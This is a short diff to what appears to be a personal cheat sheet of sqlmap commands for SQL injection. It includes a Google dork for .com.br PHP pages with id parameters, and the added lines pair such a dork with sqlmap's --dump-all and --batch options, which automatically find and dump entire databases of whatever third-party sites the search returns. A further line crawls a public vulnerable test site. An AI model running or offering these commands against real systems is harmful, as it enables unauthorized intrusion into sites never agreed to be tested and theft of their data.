@@ -4,6 +4,8 @@
 
     site: .com.br inurl .php id=
 
+# finding vuln parameter using google dork
+    sqlmap -g "inurl:index.php?id=" --dump-all --batch --threads 7 -o sqldumldataauto.txt
 # auto crawling command
 
     sqlmap -u "http://testphp.vulnweb.com/" --crawl 3 --batch --threads 5 --random-agent --risk 1 --level 1 -o sqlcrawl.txt
